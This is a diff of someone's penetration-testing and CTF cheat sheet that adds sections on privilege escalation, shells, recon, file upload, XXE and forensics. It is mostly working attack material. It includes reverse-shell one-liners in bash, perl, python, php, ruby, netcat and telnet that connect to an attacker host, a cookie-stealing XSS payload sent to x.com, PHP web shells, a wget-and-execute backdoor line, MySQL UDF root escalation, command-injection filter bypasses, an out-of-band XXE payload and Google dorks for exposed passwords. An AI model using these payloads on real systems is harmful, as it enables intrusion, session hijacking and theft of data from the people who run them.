@@ -18,26 +18,168 @@ IMPORTANT FACT
 **if any send message or comment try "><script>window.location="//x.com"+document.cookie> to get cookie
 **if there is like id=123 then consider id=1/0 as admin account and continue attack
 **scp bob@servername.com:/home/bob/public_html/index.php Downloads/
-**cewl -d 0 -w output.txt http://x.com //used to generate wordlist from webpages
+**cewl -d 0 -w output.txt http://x.com //used togenerate wordlist from webpages
 **If found any template engine like flask jinja etc then put {{5*5}},{{config}}
 **hydra -l user-P pass.txt ftp://192.168.2.155
 
+VULNHUB
+========================================================================================
+***https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+***https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells
+***https://www.contextis.com/blog/data-exfiltration-via-blind-os-command-injection
+***https://github.com/Shiva108/CTF-notes/blob/master/Notes%20VA/Local%20Linux%20Enumeration%20n%20Privilege%20Escalation%20Cheatsheet%20.txt
+
+*******must read source code carefully
+*******must read nmap scan port carefully and search exploit for that port.
+*******must search in google for vulnerability if unknown keyword found
+
+
+**sudo -l //check current user permission
+
+**cat /etc/fstab //check unmount filesystem
+
+**smbscanner usiing enum4linux -o -i -a ip
+**reverse shell -  bash -i >& /dev/tcp/192.168.1.16/1234 0>&1
+**find os  release version and check searchsploit 
+
+**/etc/sudoers
+**netstat -tunlp //list listening with pid/program name
+   now u can check info about that pid using ls -l /proc/<pid>
+
+upgrade to pty/tty shell
+-------------------
+python -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+/bin/sh -i
+find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ; 	find
+awk 'BEGIN {system("/bin/bash")}' awk
+
+
+find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+
+
+find / -writable -type d 2>/dev/null      # world-writeable folders
+find / -perm -222 -type d 2>/dev/null     # world-writeable folders
+find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+find / -perm -o x -type d 2>/dev/null     # world-executable folders
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+
+
+/proc/self =>return info about who called this file.
+sometime appache httpd need configuration file,which need to run using commandline.and in that case we use /proc/seld/cmdline
+it contain configuration path ,log path etc
+
+/proc/self/fd/0..15.. //return the directory information that proccess currently hold.
+/proc/self/environ //environment varriable
+/proc/self/console – Information about current consoles including tty.
+/proc/self/mounts – List of all mounts in use by system.
+/proc/self/partitions – Detailed info about partitions available to the system.
+/proc/self/0..25.. ---- //information about PID, it contains many file about that PID.
+
+also there ismany directory inside /proc or /proc/self or /proc/<pid> 
+    cwd – a link to the current working directory of the process
+    exe – link to the executable of the process
+    root – link to the work directory of the process
+
+root mysql to root system
+-------------------------
+ls -la /usr/lib/lib_mysqludf_sys.so //check existance
+mysql> select sys_exec('usermod -a -G admin john');
+or
+mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
+mysql> select sys_exec('chmod u+s /bin/bash');
+
+find file /search
+===========================================================
+find . -name testfile.txt =>current directory /subdirectory
+find /home -type f -name '*.jpg
+find / -size 50c
+find / -mtime 1 //find file which midfied 1day ago
+find / -user syslog
+find / -perm 644
+find / -group shadow
+
+
+ SHELL/REVERSE SHELL
+====================================
+https://github.com/s0md3v/nano
+<?$x=$_GET;$x[p]=='_'&&$x[f]($x[c]);
+http://example.com/nano.php?f=function&c=command&p=password
+<?$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
+
+https://netsec.ws/?p=331
+
+
+
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 //bash shell
+ 0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
+
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.2.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
+
+nc -c /bin/sh attackerip 4444 //1
+/bin/sh | nc attackerip 4444  //2
+rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p //3
+
+#1
+nc <attacker_ip> <port> -e /bin/bash
+#2
+mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
+#3
+/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
+#4
+mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
+#5
+telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
+#7
+wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
+
+
+DORK
+=================
+inurl:jira AND intitle:login AND inurl:[company_name
+inurl:https://trello.com AND intext:@gmail.com AND intext:password
+
+OPEN SOURCE SEARCH
+=====================
+grep -r 'mysql_query' ./*.php | grep '$_'
+grep -R "GET"
+
+
 RECON TIPS
-==================================================================================================================
+=================
 1. subdomain with aquatone
-2.Directory scan 
+2.shodan search org:"google"//  google.com
 3. subdomain with cencys using  443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:edited.de
+   also search with domain like google.com
   jenkins
 ---------
  a)REDACTED-jenkins-$env.sc-corp.net  replace env with pod.stage,test,dev,alpha,beta,local
  try login using google account
  http://nahamsec.com/secure-your-jenkins-instance-or-hackers-will-force-you-to/
-
-2.s3 bucket with lazzys3
-3.shodan search hostname:,port:,os:,country:,
+4.webarchive using http://web.archive.org/cdx/search/cdx?url=quantopian.com/*&output=text&fl=original&collapse=urlkey
+2.s3 bucket
 
 TOOLS
-========================================================================================================================
+==============================
 dnsrebinding
 -------------
 https://www.kitploit.com/2018/05/whonow-malicious-dns-server-for.html
@@ -47,9 +189,20 @@ ngrok-backdoor tunnel
 https://www.kitploit.com/2018/04/grok-backdoor-backdoor-with-ngrok.html
 
 
+JAVASCRIPT XHR REQUEST
+=======================
+ <script>
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open("GET","file:///etc/passwd");
+x.send();
+</script> 
 
-CROSSDOMAIN XML
-============================================
+
+CROSSDOMAIN
+=============
 https://sethsec.blogspot.in/2014/03/exploiting-misconfigured-crossdomainxml.html
 http://gursevkalra.blogspot.in/2013/08/bypassing-same-origin-policy-with-flash.html
 https://www.paladion.net/blogs/weak-crossdomain-xml-and-its-exploitation-poc
@@ -65,9 +218,9 @@ https://login.mailchimp.com/oauth2/authorize?response_type=token&client_id=11204
 https://prakharprasad.com/facebook-mailchimp-application-oauth-2-0-misconfiguration/
 
 FILE UPLOAD
-==========================================================================================================================
+============
 1.if image upload try 
- a) imagemagick out-of-band https://www.exploit-db.com/exploits/39767/
+ a) imagemagick out-of-band
  b) imagemagick pillete extractor
       using https://github.com/neex/gifoeb
             ./gifoeb gen 1123x987 dump.jpg
@@ -75,11 +228,15 @@ FILE UPLOAD
             ./gifoeb gen 1123x987 dump.bmp
             ./gifoeb gen 1123x987 dump.tiff
             ./gifoeb gen 1123x987 dump.tif
-         download and save the preview as preview.ext
-		 r=$(identify -format '%wx%h' preview.ext[0]) && mkdir -p for_upload && for i in `seq 1 10`; do ./gifoeb gen $r for_upload/$i.gif;done
-		 Upload for_upload/*.gif to the webservice and download the previews.
+         
 
-          for p in previews/*; do  ./gifoeb recover $p | strings; done
+          for p in previews/*; do
+            ./gifoeb recover $p | strings;
+          done
+     i)imagemagick curl vulnerability using svg 
+       <image xlink:href="https://hethical.io/content/images/2016/06/me.jpg&quot;; eval ls; echo &quot;vulnerable" x="0" y="0" height="640px" width="480px"/>
+    https://hethical.io/trello-bug-bounty-access-servers-files-using-imagetragick/
+
  c) pixel flood
  d) svg upload
  e) if image croping then try https://hackerone.com/reports/212696
@@ -93,18 +250,8 @@ FILE UPLOAD
 6.if docx,doc,xlsx upload
   a) try xxe
 
- SOFTWARE VULNERABILITY
-=============================================================================================
-JETLEAk
-+++++++++++++
-https://hackerone.com/reports/143935
-https://www.exploit-db.com/exploits/39455/
-https://github.com/GDSSecurity/Jetleak-Testing-Script
- 
- 
- 
 APACHE
-++++++++++++++++
+====================
 Apache Struts2 2.0.0 < 2.3.15 - Prefixed Parameters OGNL Injection
 -------------------------------------
 action:, redirect:, redirectAction:, method:
@@ -113,7 +260,7 @@ https://www.exploit-db.com/exploits/44583/?rss&utm_source=dlvr.it&utm_medium=twi
 
 
 XXE via spreadsheet(doc,docx,xlsx)
-=========================================================================================================================
+=================================
 **https://buer.haus/xxegen/
 **goto https://github.com/BuffaloWill/oxml_xxe and generate many xxe payload file
 **
@@ -131,6 +278,7 @@ you can add payload in following file...
 DOCX=>/word/document.xml
 PPTX=>/ppt/presentation.xml
 XLSX=>/xl/workbook.xml
+
 XSS
 --------------
 < !ENTITY post "<script>alert(1)...
@@ -140,8 +288,22 @@ LFI
 Relationship Id="rId1" Type="...relationships/officeDocument" Target="/word/document.xml"
 
 
+BUG
+===========
+*** you can read local files using object, iframe or embed tags
+https://mike-n1.github.io/SSRF_P4toP2
+
+lfi using pdf
+----------
+http://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html
+
+Atlassian ssrf/xss
+--------------------
+plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com
+
+
 DIRECTORY SCANNER
-==========================================================================================================
+================
 1.dirb 2.uniscan 3.nikto 4.gobuster 
 all directory wordlist and rockyou.txt locate at /home/user/Desktop/bug_bounty/CTF/wordlist
 
@@ -150,18 +312,10 @@ sqli to xxe
 Xxxx'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % evil SYSTEM "http://haxor.com/ ">%evil;]>'),'/l') from dual)||'
 
 
-find file
-==============================================================================================================
-find . -name testfile.txt =>current directory /subdirectory
-find /home -type f -name '*.jpg
-find / -size 50c
-find / -mtime 1 //find file which midfied 1day ago
-find / -user syslog
-find / -perm 644
-find / -group shadow
+
 
 SERIALIZE
-===============================================================================================================
+=======================
 nodejs
 ----------
 {"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}
@@ -171,12 +325,18 @@ php
 O:9:"FileClass":1:{s:8:"filename";s:10:"config.php";}
 
 PHP MAGIC FUNCTION
-============================================================================================================================
+=====================
 __construct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(), __sleep(), __wakeup(), __toString(), __invoke(), __set_state() and __clone()
 
 
+COMMAND INJECTION BYPASS
+============================
+l\s
+cat /etc/pass??
+w'h'o'am'i , w"h"o"am"i, who$@ami ,$0 = /bin/bash so , echo whoami|$0
+
 COMMAND WITHOUT SPACE
-=====================================================================================================================
+======================
 1. ls$IFS-l;
 2. {cat,file.txt}
 3. IFS=:;a=cat:file.txt;$a
@@ -378,18 +538,18 @@ admin' AND password LIKE "ya%" --
 
 
 Perl Vulneraility
-==============================================================================================
+===================
 https://ehsandev.com/pico2014/web_exploitation/make_a_face.html
 http://www.cgisecurity.com/lib/sips.html
 
 ZIP/RAR cracker
-==============================================================================================
+===================
 1.rar2john ./a.rar > hash.txt
   john ./hash.txt
 2.fcrackzip
-
+fcrackzip -v -m zip6 -l 4-8 -u secret.zip
 PDF && PASSWORD
-===================================
+====================
 rockyou.txt,500-passwords.txt
 pdfcrack --wordlist=crackstation-human-only.txt mypassword.pdf
 
@@ -443,8 +603,8 @@ HASH
   john --format=Raw-MD4 test.md4 --show
 2.john file //here in file put httpbasic auth
    
-magick md5 hash
-================================================================
+md5 hash
+================
 240610708=>0e462097431906509019562988736854
 9QFHA$RNXGMR3IFDU=>0e11012cfa2a998691010213eebc6f98
 4E8F8TK=>0e1100867d17d34f6b50be0e7d4a576d
@@ -458,6 +618,30 @@ goto https://md5db.net/explore/ for specific pattern
 **input() in python equivalent to eval(raw_input())
   os.system('/bin/sh') input gives shell
 **if python script is obfuscated then may try decode to decimal or something
+
+RECYCLEBIN FORENSIC
+================
+use rifiuti2 
+
+SYSTEM IMAGE FILE
+================================
+if u given any image file then you can mount it or use in TESTDISK.
+
+binwalk -A floppy.img //list architecture
+fdisk -l floppy.img //list partition of image
+1.first try to mount it 
+  mount -t vfat -o loop flopy.img ./mnt
+2.recover using testdisk
+  testdisk floppy.img
+3.recover using  foremost
+4.run using qemu
+  qemu-system-x86_64 -fda floppy.img
+  qemu run with gdb-peda https://github.com/VoidHack/write-ups/tree/master/Square%20CTF%202017/reverse/
+5.extract using dd
+  dd if=./floppy.img of=./a.zip bs=1 skip=1234 //find this 1234 offset using binwalk floppy.img
+  
+6.can use this https://wiki.sleuthkit.org/index.php?title=TSK_Tool_Overview
+
 
   RSA
 ========================================================================================
@@ -682,7 +866,7 @@ padbuster http://88.198.233.174:35082/profile.php yDMsIbvCzotYY7G2sLl6vH2zuah2qq
 
 RAW HASH
 ===============
-9fcef3897afe2acc3e7438ce14f5b6a3   //raw hash make sql injection INCTF
+9fcef3897afe2acc3e7438ce14f5b6a3   raw hash make sql injection INCTF
 
 MEDIA
 ====================
